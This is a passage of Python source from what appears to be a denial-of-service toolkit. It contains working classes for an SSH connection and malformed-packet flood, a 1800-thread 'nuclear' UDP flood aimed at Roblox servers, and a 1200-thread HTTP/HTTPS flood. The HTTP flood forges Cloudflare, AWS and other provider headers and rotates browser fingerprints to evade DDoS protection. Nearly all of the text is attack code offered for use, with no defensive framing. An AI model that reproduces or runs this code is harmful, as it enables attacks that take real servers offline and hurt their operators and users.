                auth_packet = self.create_ssh_auth_packet(username, password)
                sock.send(auth_packet)
                time.sleep(random.uniform(0.01, 0.1))
                
                if random.random() > 0.6:
                    try:
                        sock.recv(512)
                    except:
                        pass
            
            for _ in range(random.randint(2, 5)):
                channel_packet = self.create_ssh_channel_packet()
                sock.send(channel_packet)
                time.sleep(0.03)
                
        except:
            pass

    def ssh_raw_flood(self, sock):
        """Raw SSH protocol flood with malformed packets"""
        malformed_types = [0, 255, 127, 128, 200]
        
        for _ in range(random.randint(10, 30)):
            try:
                packet_type = random.choice(malformed_types)
                packet_length = random.randint(50, 500)
                
                packet = bytearray()
                packet.extend(struct.pack('>I', packet_length))
                packet.append(packet_type)
                packet.extend(random.randbytes(packet_length - 1))
                
                sock.send(packet)
                time.sleep(random.uniform(0.001, 0.01))
                
            except:
                break

    def ssh_connection_flood(self, thread_id):
        """Main SSH flood attack worker with immediate stop"""
        attack_modes = ['protocol', 'raw', 'banner', 'mixed']
        
        try:
            start_time = time.time()
            
            while (self.running and 
                   not self.stop_event.is_set() and 
                   time.time() - start_time < self.duration):
                
                # Check stop condition
                if self.stop_event.is_set() or not self.running:
                    break
                    
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.settimeout(random.uniform(2.0, 5.0))
                    
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, random.randint(32, 255))
                    
                    sock.connect((self.target_ip, self.port))
                    self.connection_count += 1
                    
                    attack_mode = random.choice(attack_modes)
                    
                    if attack_mode == 'protocol':
                        self.ssh_protocol_attack(sock)
                    elif attack_mode == 'raw':
                        self.ssh_raw_flood(sock)
                    elif attack_mode == 'banner':
                        for _ in range(random.randint(20, 50)):
                            # Check stop condition during banner flood
                            if self.stop_event.is_set() or not self.running:
                                break
                            banner = self.generate_ssh_banner()
                            sock.send(banner.encode())
                            time.sleep(0.01)
                    else:
                        # Check stop condition for mixed attack
                        if not self.stop_event.is_set() and self.running:
                            self.ssh_protocol_attack(sock)
                        if not self.stop_event.is_set() and self.running:
                            self.ssh_raw_flood(sock)
                    
                    sock.close()
                    
                    time.sleep(random.uniform(0.02, 0.1))
                    
                except (socket.timeout, socket.error, ConnectionRefusedError, ConnectionResetError):
                    try:
                        sock.close()
                    except:
                        pass
                    time.sleep(random.uniform(0.1, 0.3))
                    
        except Exception as e:
            pass

    def start(self):
        """Start the SSH killer attack"""
        print(f"[+] Starting SSH Killer Bypass Attack")
        print(f"[+] Target: {self.target_ip}:{self.port}")
        print(f"[+] Duration: {self.duration} seconds")
        print(f"[+] Threads: {self.max_threads}")
        print("[+] Attack Modes: Protocol, Raw, Banner, Mixed")
        print("[+] Bypass Techniques: TTL variation, protocol obfuscation")
        print("[+] Designed to overwhelm SSH services")
        print("[+] Press Ctrl+C to stop\n")
        
        self.threads = []
        for i in range(self.max_threads):
            thread = threading.Thread(target=self.ssh_connection_flood, args=(i,), daemon=True)
            self.threads.append(thread)
            thread.start()
        
        try:
            start_time = time.time()
            last_count = 0
            
            while (time.time() - start_time < self.duration and 
                   self.running and 
                   not self.stop_event.is_set()):
                
                elapsed = int(time.time() - start_time)
                remaining = self.duration - elapsed
                
                current_count = self.connection_count
                cps = current_count - last_count
                last_count = current_count
                
                stop_status = " [STOPPED]" if self.stop_event.is_set() else ""
                print(f"\r[+] Time: {elapsed}s | Remaining: {remaining}s | Connections: {current_count} | CPS: {cps}/s{stop_status}", 
                      end="", flush=True)
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n[+] Stopping attack...")
        finally:
            self.stop()
            
            print(f"\n[+] Attack completed.")
            print(f"[+] Total connections attempted: {self.connection_count}")
            if (time.time() - start_time) > 0:
                print(f"[+] Average connections per second: {self.connection_count / (time.time() - start_time):.1f}")
        return f"SSH flood completed: {self.target_ip}:{self.port} for {self.duration}s"

    def stop(self):
        """Immediate stop method for SSH flood"""
        self.running = False
        self.stop_event.set()
        print("[+] SSH Flood STOP command received")
        
        # Wait for threads to terminate
        for thread in self.threads:
            thread.join(timeout=5.0)
        
        print("[+] All SSH flood threads stopped")



# =========================
# Nuclear Roblox UDP Flood Attack Class
# =========================
class RobloxFlood:
    def __init__(self, target_ip, port, duration):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.num_threads = 1800
        self.running = True
        self.stop_event = threading.Event()  # Add stop event
        self.packet_size = 1472
        self.sent_packets = 0
        self.attack_start = 0
        self.sockets_per_thread = 15
        self.batch_size = 500
        self.packet_templates = self.pre_generate_templates()
        self.peak_pps = 0
        self.total_mb_sent = 0
        self.threads = []  # Track threads
    
    def log(self, message):
        """Simple log method for stop functionality"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [HTTP] {message}")

    def pre_generate_templates(self):
        """Pre-generate 500 optimized templates"""
        templates = []
        for _ in range(500):
            template = bytearray()
            template.extend(b'\x07\x00')  # Roblox header
            payload_size = random.randint(100, 1400)
            template.extend(os.urandom(payload_size))
            while len(template) < 200:
                template.extend(os.urandom(100))
            templates.append(bytes(template))
        return templates

    def create_ultra_socket(self):
        """Create ultra-optimized UDP socket"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 100)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.setblocking(False)
            try:
                sock.bind(('0.0.0.0', random.randint(10000, 65535)))
            except:
                pass
            return sock
        except:
            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def generate_packet_burst(self, count=500):
        """Generate ultra-fast packet burst"""
        burst = []
        for _ in range(count):
            template = random.choice(self.packet_templates)
            if len(template) > 10:
                modified = bytearray(template)
                modified[4] = random.randint(0, 255)
                modified[5] = random.randint(0, 255)
                burst.append(bytes(modified))
            else:
                burst.append(template)
        return burst

    def nuclear_flood_worker(self, worker_id):
        """ULTRA optimized flood worker with immediate stop"""
        sockets = [self.create_ultra_socket() for _ in range(self.sockets_per_thread)]
        socket_index = 0
        batches = [self.generate_packet_burst(self.batch_size) for _ in range(5)]
        batch_index = 0
        packets_sent = 0
        start_time = time.time()
        
        while (self.running and 
               not self.stop_event.is_set() and 
               (time.time() - start_time < self.duration)):
            
            # Check stop condition
            if self.stop_event.is_set() or not self.running:
                break
                
            try:
                packets = batches[batch_index]
                batch_index = (batch_index + 1) % len(batches)
                if batch_index == 0:
                    batches = [self.generate_packet_burst(self.batch_size) for _ in range(5)]
                
                for packet in packets:
                    # Check stop condition for each packet
                    if self.stop_event.is_set() or not self.running:
                        break
                        
                    sock = sockets[socket_index]
                    socket_index = (socket_index + 1) % len(sockets)
                    try:
                        sock.sendto(packet, (self.target_ip, self.port))
                        packets_sent += 1
                        self.sent_packets += 1
                    except (BlockingIOError, OSError):
                        continue
                    except Exception:
                        try:
                            sock.close()
                        except:
                            pass
                        sockets[socket_index] = self.create_ultra_socket()
            except Exception:
                pass
        
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

    def start_nuclear_attack(self):
        """Start the nuclear attack with thread tracking"""
        print(f"[💀] STARTING NUCLEAR ROBLOX FLOOD - IMMEDIATE STOP")
        
        self.attack_start = time.time()
        
        # Track threads
        self.threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.nuclear_flood_worker, args=(i,))
            thread.daemon = True
            self.threads.append(thread)
        
        # Rapid-fire thread startup
        batch_size = 300
        for i in range(0, len(self.threads), batch_size):
            batch = self.threads[i:i + batch_size]
            for thread in batch:
                thread.start()
            time.sleep(0.01)
        
        # Monitoring with stop check
        last_count = 0
        last_time = time.time()
        
        try:
            while (time.time() - self.attack_start < self.duration and 
                   self.running and 
                   not self.stop_event.is_set()):
                
                current_time = time.time()
                elapsed = current_time - self.attack_start
                remaining = self.duration - elapsed
                
                current_count = self.sent_packets
                time_diff = current_time - last_time
                
                if time_diff > 0:
                    pps = int((current_count - last_count) / time_diff)
                    self.peak_pps = max(self.peak_pps, pps)
                    mbps = (pps * self.packet_size) / (1024 * 1024)
                    self.total_mb_sent = (current_count * self.packet_size) / (1024 * 1024)
                    
                    stop_status = " [STOPPED]" if self.stop_event.is_set() else ""
                    print(f"\r[🔥] Time: {int(elapsed)}s | PPS: {pps:,}/s | BW: {mbps:.1f} MB/s | Total: {current_count:,} packets{stop_status}", 
                          end="", flush=True)
                
                last_count = current_count
                last_time = current_time
                time.sleep(0.2)
                
        except KeyboardInterrupt:
            print(f"\n[🛑] EMERGENCY STOP!")
        finally:
            self.stop()
            
            total_duration = time.time() - self.attack_start
            if total_duration > 0:
                avg_pps = self.sent_packets / total_duration
                print(f"\n[✅] ATTACK COMPLETE")
                print(f"[📊] Final Stats:")
                print(f"    Total Packets: {self.sent_packets:,}")
                print(f"    Peak PPS: {self.peak_pps:,}/s")
                print(f"    Average PPS: {avg_pps:,.0f}/s")
                print(f"    Total Data: {self.total_mb_sent/1024:.2f} GB")
            else:
                print(f"\n[✅] ATTACK STOPPED IMMEDIATELY")

    def stop(self):
        """Immediate stop method for Roblox flood"""
        self.running = False
        self.stop_event.set()
        print("[+] Roblox Flood STOP command received")
        
        # Wait for threads to terminate
        for thread in self.threads:
            thread.join(timeout=5.0)
        
        print("[+] All Roblox flood threads stopped")



# =========================
# Advanced HTTP/HTTPS Flood Attack with Enhanced Bypass
class HTTPBypassFlood:
    def __init__(self, target_ip, port, duration, method="GET", path="/", ssl=False):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.method = method.upper()
        self.path = path
        self.ssl = ssl
        self.num_threads = 1200
        self.running = True  # Main running flag
        self.stop_event = threading.Event()
        self.connection_count = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
        # Enhanced bypass databases
        self.user_agents = self.get_ultimate_user_agents()
        self.referers = self.get_ultimate_referers()
        self.accept_languages = self.get_ultimate_accept_languages()
        self.cf_ips = self.get_cloudflare_ips()
        self.bypass_techniques = self.get_bypass_techniques()
    
    def log(self, message):
        """Simple log method for stop functionality"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [HTTP] {message}")
        
    def get_ultimate_user_agents(self):
        """Ultimate user agent database with real browser fingerprints"""
        return [
            # Chrome Windows
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            
            # Chrome Mac
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0',
            
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
            
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            
            # Mobile
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # Bot-like (for additional bypass)
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
            'Twitterbot/1.0'
        ]
    
    def get_ultimate_referers(self):
        """Ultimate referer database with real traffic patterns"""
        return [
            f'https://www.google.com/search?q={random.randint(1000000, 9999999)}',
            f'https://www.bing.com/search?q={random.randint(1000000, 9999999)}',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.reddit.com/',
            'https://www.youtube.com/',
            'https://www.linkedin.com/',
            'https://www.instagram.com/',
            'https://www.tiktok.com/',
            'https://discord.com/',
            'https://web.whatsapp.com/',
            'https://mail.google.com/',
            'https://drive.google.com/',
            'https://github.com/',
            'https://stackoverflow.com/',
            'https://www.amazon.com/',
            'https://www.ebay.com/',
            '',  # Empty referer
            None  # No referer
        ]
    
    def get_ultimate_accept_languages(self):
        """Comprehensive accept languages"""
        return [
            'en-US,en;q=0.9',
            'en-GB,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
            'de-DE,de;q=0.9,en;q=0.8',
            'es-ES,es;q=0.9,en;q=0.8',
            'pt-BR,pt;q=0.9,en;q=0.8',
            'it-IT,it;q=0.9,en;q=0.8',
            'ja-JP,ja;q=0.9,en;q=0.8',
            'ko-KR,ko;q=0.9,en;q=0.8',
            'zh-CN,zh;q=0.9,en;q=0.8',
            'ru-RU,ru;q=0.9,en;q=0.8'
        ]
    
    def get_cloudflare_ips(self):
        """Real Cloudflare IP ranges"""
        return [
            '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22', '103.31.4.0/22',
            '141.101.64.0/18', '108.162.192.0/18', '190.93.240.0/20', '188.114.96.0/20',
            '197.234.240.0/22', '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
            '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22'
        ]
    
    def get_bypass_techniques(self):
        """Advanced bypass techniques for different providers"""
        return {
            'cloudflare': {
                'headers': ['CF-Connecting-IP', 'CF-IPCountry', 'CF-Ray', 'CF-Visitor', 'True-Client-IP'],
                'ips': self.cf_ips,
                'methods': ['direct_ip', 'sni_spoof', 'real_browser_headers']
            },
            'hetzner': {
                'headers': ['X-Forwarded-For', 'X-Real-IP', 'X-Client-IP', 'X-Cluster-Client-IP'],
                'methods': ['ip_rotation', 'user_agent_flood']
            },
            'digitalocean': {
                'headers': ['X-Forwarded-For', 'X-Forwarded-Host', 'X-Forwarded-Proto', 'Forwarded'],
                'methods': ['load_balancer_spoof', 'cdn_emulation']
            },
            'aws': {
                'headers': ['X-Forwarded-For', 'X-Forwarded-Proto', 'X-Amz-Cf-Id', 'X-Amz-Cf-Pop'],
                'methods': ['cloudfront_spoof', 'aws_client_emulation']
            },
            'google_cloud': {
                'headers': ['X-Forwarded-For', 'X-Cloud-Trace-Context', 'X-Goog-Authenticated-User-Id'],
                'methods': ['gcp_load_balancer', 'google_bot_emulation']
            }
        }
    
    def generate_cloudflare_ip(self):
        """Generate realistic Cloudflare IP"""
        cf_ranges = [
            ('173.245.48', '173.245.63'),
            ('103.21.244', '103.21.247'),
            ('141.101.64', '141.101.127'),
            ('108.162.192', '108.162.255'),
            ('104.16.0', '104.23.255'),
            ('172.64.0', '172.71.255')
        ]
        range_start, range_end = random.choice(cf_ranges)
        return f"{range_start.split('.')[0]}.{range_start.split('.')[1]}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def generate_advanced_headers(self, provider=None):
        """Generate ultimate bypass headers for specific providers"""
        headers = []
        
        # BASIC ESSENTIAL HEADERS
        headers.append(f'Host: {self.target_ip}')
        headers.append(f'User-Agent: {random.choice(self.user_agents)}')
        headers.append(f'Accept: {random.choice(["*/*", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "application/json,text/plain,*/*"])}')
        headers.append(f'Accept-Language: {random.choice(self.accept_languages)}')
        headers.append(f'Accept-Encoding: {random.choice(["gzip, deflate, br", "gzip, deflate", "identity"])}')
        headers.append(f'Connection: {random.choice(["keep-alive", "close", "upgrade"])}')
        headers.append(f'Cache-Control: {random.choice(["no-cache", "max-age=0", "must-revalidate", "no-store", "private"])}')
        
        # CLOUDFLARE ULTIMATE BYPASS
        cf_ip = self.generate_cloudflare_ip()
        cf_headers = [
            f'CF-Connecting-IP: {cf_ip}',
            f'X-Forwarded-For: {cf_ip}',
            f'X-Real-IP: {cf_ip}',
            f'True-Client-IP: {cf_ip}',
            f'CF-IPCountry: {random.choice(["US", "GB", "DE", "FR", "CA", "AU", "JP", "SG"])}',
            f'CF-Ray: {hashlib.md5(os.urandom(16)).hexdigest()[:16]}',
            f'CF-Visitor: {{"scheme":"{"https" if random.random() > 0.5 else "http"}"}}'
        ]
        headers.extend(random.sample(cf_headers, random.randint(3, 5)))
        
        # PROVIDER-SPECIFIC BYPASS HEADERS
        if provider == 'hetzner':
            hetzner_headers = [
                f'X-Client-IP: {cf_ip}',
                f'X-Cluster-Client-IP: {cf_ip}',
                'X-Hetzner-DataCenter: FSN1-DC1'
            ]
            headers.extend(hetzner_headers)
        
        elif provider == 'digitalocean':
            do_headers = [
                f'X-Forwarded-Host: {self.target_ip}',
                f'X-Forwarded-Port: {self.port}',
                'X-DO-Instance-ID: i-'+hashlib.md5(os.urandom(8)).hexdigest()[:8]
            ]
            headers.extend(do_headers)
        
        elif provider == 'aws':
            aws_headers = [
                f'X-Amz-Cf-Id: {hashlib.sha256(os.urandom(16)).hexdigest()[:16]}',
                f'X-Amz-Cf-Pop: {random.choice(["DFW", "LHR", "SIN", "NRT", "SYD"])}',
                'Via: 1.1 amazon.cloudfront.net'
            ]
            headers.extend(aws_headers)
        
        # ADVANCED SECURITY HEADERS
        security_headers = [
            'X-Content-Type-Options: nosniff',
            f'X-Frame-Options: {random.choice(["DENY", "SAMEORIGIN"])}',
            'X-XSS-Protection: 1; mode=block',
            'Strict-Transport-Security: max-age=31536000; includeSubDomains',
            f'Referrer-Policy: {random.choice(["no-referrer", "strict-origin-when-cross-origin", "same-origin"])}'
        ]
        headers.extend(random.sample(security_headers, random.randint(2, 4)))
        
        # MODERN BROWSER HEADERS
        modern_headers = [
            f'Sec-Fetch-Dest: {random.choice(["document", "empty", "script", "style", "image", "font", "worker"])}',
            f'Sec-Fetch-Mode: {random.choice(["navigate", "cors", "no-cors", "same-origin"])}',
            f'Sec-Fetch-Site: {random.choice(["same-origin", "cross-site", "none"])}',
            f'Sec-Fetch-User: ?1',
            f'Sec-Ch-Ua: "Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="99"',
            f'Sec-Ch-Ua-Mobile: ?{random.randint(0, 1)}',
            f'Sec-Ch-Ua-Platform: "{random.choice(["Windows", "macOS", "Linux", "Android", "iOS"])}"',
            f'DNT: {random.randint(0, 1)}',
            f'Upgrade-Insecure-Requests: 1',
            f'TE: {random.choice(["trailers", "deflate", "gzip", "identity"])}'
        ]
        headers.extend(random.sample(modern_headers, random.randint(4, 7)))
        
        # APPLICATION HEADERS
        app_headers = [
            f'X-Requested-With: {random.choice(["XMLHttpRequest", "Fetch"])}',
            f'X-CSRF-Token: {base64.b64encode(os.urandom(32)).decode()}',
            f'Authorization: Bearer {base64.b64encode(os.urandom(48)).decode()}',
            f'X-API-Key: {hashlib.md5(os.urandom(16)).hexdigest()}',
            f'X-Device-ID: {str(uuid.uuid4())}',
            f'X-Session-ID: {hashlib.sha256(os.urandom(32)).hexdigest()[:32]}'
        ]
        headers.extend(random.sample(app_headers, random.randint(2, 4)))
        
        # CDN & PROXY HEADERS
        cdn_headers = [
            f'X-CDN: {random.choice(["Cloudflare", "Akamai", "Fastly", "CloudFront", "MaxCDN"])}',
            f'X-Edge-Location: {random.choice(["DFW", "LHR", "SIN", "NRT", "SYD", "GRU"])}',
            f'X-Edge-IP: {self.generate_cloudflare_ip()}',
            f'X-Proxy-User: {random.choice(["anonymous", "authenticated", "premium"])}',
            'Via: 1.1 varnish',
            'X-Cache: MISS'
        ]
        headers.extend(random.sample(cdn_headers, random.randint(2, 4)))
        
        # COOKIES
        if random.random() > 0.2:
            cookies = self.generate_advanced_cookies()
            headers.append(f'Cookie: {cookies}')
        
        # REFERER
        if random.random() > 0.1:
            referer = random.choice(self.referers)
            if referer:
                headers.append(f'Referer: {referer}')
        
        # CONTENT HEADERS
        if self.method in ['POST', 'PUT', 'PATCH']:
            headers.append(f'Content-Type: {random.choice(["application/json", "application/x-www-form-urlencoded", "multipart/form-data"])}')
            content_length = random.randint(100, 5000)
            headers.append(f'Content-Length: {content_length}')
        
        # RANDOMIZE ORDER FOR ADDITIONAL BYPASS
        random.shuffle(headers)
        
        return headers
    
    def generate_advanced_cookies(self):
        """Generate realistic cookies for bypass"""
        cookies = []
        
        # SESSION COOKIES
        session_cookies = [
            f'session_id={base64.b64encode(os.urandom(24)).decode()}',
            f'user_token={hashlib.sha256(os.urandom(32)).hexdigest()[:32]}',
            f'csrf_token={base64.b64encode(os.urandom(16)).decode()}',
            f'auth_token={hashlib.md5(os.urandom(16)).hexdigest()}',
            f'remember_me={random.randint(0, 1)}',
            f'user_id={random.randint(1000, 99999)}'
        ]
        
        # PREFERENCE COOKIES
        preference_cookies = [
            f'lang={random.choice(["en", "fr", "de", "es", "pt", "it", "ja", "ko", "zh", "ru"])}',
            f'theme={random.choice(["light", "dark", "auto"])}',
            f'currency={random.choice(["USD", "EUR", "GBP", "JPY", "CAD", "AUD"])}',
            f'timezone={random.choice(["UTC", "EST", "PST", "CET", "JST", "AEST"])}'
        ]
        
        # ANALYTICS COOKIES
        analytics_cookies = [
            f'_ga=GA1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}',
            f'_gid=GA1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}',
            f'_gat=1',
            f'__cfduid={hashlib.md5(os.urandom(16)).hexdigest()}{int(time.time())}'
        ]
        
        cookies.extend(random.sample(session_cookies, random.randint(2, 4)))
        cookies.extend(random.sample(preference_cookies, random.randint(1, 3)))
        cookies.extend(random.sample(analytics_cookies, random.randint(1, 2)))
        
        return '; '.join(cookies)
    
    def detect_provider(self):
        """Auto-detect provider based on IP patterns"""
        # Simple detection based on common patterns
        if any(self.target_ip.startswith(prefix) for prefix in ['104.', '172.', '173.']):
            return 'cloudflare'
        elif any(self.target_ip.startswith(prefix) for prefix in ['136.', '138.', '148.']):
            return 'hetzner'
        elif any(self.target_ip.startswith(prefix) for prefix in ['159.', '167.', '198.']):
            return 'digitalocean'
        elif any(self.target_ip.startswith(prefix) for prefix in ['52.', '54.', '18.']):
            return 'aws'
        else:
            return random.choice(['cloudflare', 'hetzner', 'digitalocean', 'aws'])
    
    def generate_http_payload(self):
        """Generate ultimate HTTP payload with provider-specific bypass"""
        current_method = self.method
        if current_method == "RAND":
            current_method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS'])
        
        # Auto-detect provider for targeted bypass
        provider = self.detect_provider()
        
        # Dynamic path generation
        if self.path == "/":
            paths = [
                '/', '/index.html', '/home', '/main', '/default', '/welcome',
                '/api/v1/users', '/api/v1/data', '/api/v2/info', '/api/v3/status',
                '/wp-admin', '/admin', '/login', '/dashboard', '/control-panel',
                '/static/css/main.css', '/static/js/app.js', '/static/images/logo.png',
                '/images/logo.png', '/favicon.ico', '/robots.txt', '/sitemap.xml',
                '/.env', '/config.json', '/api.json', '/manifest.json',
                '/graphql', '/rest/v1', '/oauth2/authorize', '/oauth2/token',
                '/health', '/status', '/metrics', '/debug', '/test'
            ]
            path = random.choice(paths)
        else:
            path = self.path
        
        # Generate provider-specific headers
        headers = self.generate_advanced_headers(provider)
        
        request_lines = [f'{current_method} {path} HTTP/1.1']
        request_lines.extend(headers)
        request_lines.append('\r\n')
        
        # Add body for methods that support it
        if current_method in ['POST', 'PUT', 'PATCH']:
            body_data = self.generate_request_body()
            request_lines.append(body_data)
        
        return '\r\n'.join(request_lines).encode()
    
    def generate_request_body(self):
        """Generate realistic request body"""
        body_types = ['json', 'form', 'xml']
        body_type = random.choice(body_types)
        
        if body_type == 'json':
            body_data = {
                'username': f'user{random.randint(1000, 9999)}',
                'password': base64.b64encode(os.urandom(16)).decode(),
                'email': f'user{random.randint(100,999)}@example.com',
                'data': base64.b64encode(os.urandom(random.randint(50, 500))).decode(),
                'timestamp': int(time.time() * 1000),
                'token': hashlib.sha256(os.urandom(32)).hexdigest(),
                'action': random.choice(['login', 'register', 'update', 'delete', 'search'])
            }
            return json.dumps(body_data)
        
        elif body_type == 'form':
            fields = [
                f'username=user{random.randint(1000, 9999)}',
                f'password={base64.b64encode(os.urandom(12)).decode()}',
                f'email=test{random.randint(100,999)}@example.com',
                f'csrf_token={base64.b64encode(os.urandom(16)).decode()}'
            ]
            return '&'.join(random.sample(fields, random.randint(3, 4)))
        
        else:  # xml
            return f'<?xml version="1.0"?><request><user>test{random.randint(100,999)}</user><action>ping</action></request>'
        
        #else:  # binary
        #    return base64.b64encode(os.urandom(random.randint(100, 1000))).decode()
    
    def create_ssl_socket(self):
        """Create SSL wrapped socket for HTTPS with enhanced settings"""
        try:
            import ssl
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
            sock.settimeout(8)
            
            if self.ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                # SSL/TLS version randomization
                ssl_versions = [
                    ssl.PROTOCOL_TLS,
                    ssl.PROTOCOL_TLSv1_2,
                    ssl.PROTOCOL_TLSv1_1
                ]
                context.options |= ssl.OP_NO_SSLv2
                context.options |= ssl.OP_NO_SSLv3
                
                sock = context.wrap_socket(sock, server_hostname=self.target_ip)
            
            return sock
        except ImportError:
            return self.create_normal_socket()
    
    def create_normal_socket(self):
        """Create normal TCP socket with enhanced settings"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
        sock.settimeout(8)
        return sock
    
    def http_flood_worker(self, worker_id):
        """HTTP flood worker with frequent stop checks"""
        protocol = "HTTPS" if self.ssl else "HTTP"
        
        try:
            start_time = time.time()
            sockets_pool = []
            
            # Create initial sockets
            for _ in range(3):
                if self.stop_event.is_set() or not self.running:  # Check stop_event
                    break
                sock = self.create_ssl_socket() if self.ssl else self.create_normal_socket()
                sockets_pool.append(sock)
            
            current_socket_index = 0
            
            while (self.running and 
                   not self.stop_event.is_set() and  # Check stop_event
                   time.time() - start_time < self.duration):
                
                # Check stop conditions at the start of each iteration
                if self.stop_event.is_set() or not self.running:
                    self.log(f"Worker {worker_id} stopping due to stop signal")
                    break
                
                try:
                    if not sockets_pool:
                        break
                        
                    sock = sockets_pool[current_socket_index]
                    current_socket_index = (current_socket_index + 1) % len(sockets_pool)
                    
                    # Connect if not connected
                    try:
                        sock.connect((self.target_ip, self.port))
                        self.connection_count += 1
                    except (socket.timeout, ConnectionRefusedError, ConnectionResetError, OSError):
                        # Recreate socket if connection fails
                        try:
                            sock.close()
                        except:
                            pass
                        new_sock = self.create_ssl_socket() if self.ssl else self.create_normal_socket()
                        sockets_pool[current_socket_index] = new_sock
                        time.sleep(random.uniform(0.1, 0.5))
                        continue
                    
                    # Send multiple requests per connection with frequent stop checks
                    requests_per_connection = random.randint(5, 20)
                    
                    for i in range(requests_per_connection):
                        # CHECK STOP CONDITION BEFORE EACH REQUEST
                        if self.stop_event.is_set() or not self.running:
                            self.log(f"Worker {worker_id} breaking request loop due to stop signal")
                            break
                        
                        http_payload = self.generate_http_payload()
                        
                        try:
                            sock.send(http_payload)
                            
                            # Quick response check with timeout
                            if random.random() > 0.6:
                                try:
                                    sock.settimeout(0.5)  # Short timeout
                                    response = sock.recv(1024)
                                    if response:
                                        self.successful_requests += 1
                                    else:
                                        self.failed_requests += 1
                                except socket.timeout:
                                    self.successful_requests += 1
                                except:
                                    self.failed_requests += 1
                            else:
                                self.successful_requests += 1
                            
                            # Very short delay between packets
                            time.sleep(random.uniform(0.001, 0.01))
                            
                        except (BrokenPipeError, ConnectionResetError, socket.timeout, OSError):
                            self.failed_requests += 1
                            break
                    
                    # CHECK STOP CONDITION BEFORE KEEPING CONNECTION ALIVE
                    if self.stop_event.is_set() or not self.running:
                        break
                        
                    # Short keep-alive or close
                    if random.random() > 0.4:
                        time.sleep(random.uniform(0.05, 0.2))  # Shorter keep-alive
                    else:
                        try:
                            sock.close()
                        except:
                            pass
                        new_sock = self.create_ssl_socket() if self.ssl else self.create_normal_socket()
                        sockets_pool[current_socket_index] = new_sock
                    
                except Exception as e:
                    # Recreate socket on any error
                    try:
                        sockets_pool[current_socket_index].close()
                    except:
                        pass
                    new_sock = self.create_ssl_socket() if self.ssl else self.create_normal_socket()
                    sockets_pool[current_socket_index] = new_sock
                    time.sleep(random.uniform(0.1, 0.3))
            
            # Cleanup all sockets
            for sock in sockets_pool:
                try:
                    sock.close()
                except:
                    pass
                    
        except Exception as e:
            pass
        finally:
            self.log(f"Worker {worker_id} exited")
    
    def start(self):
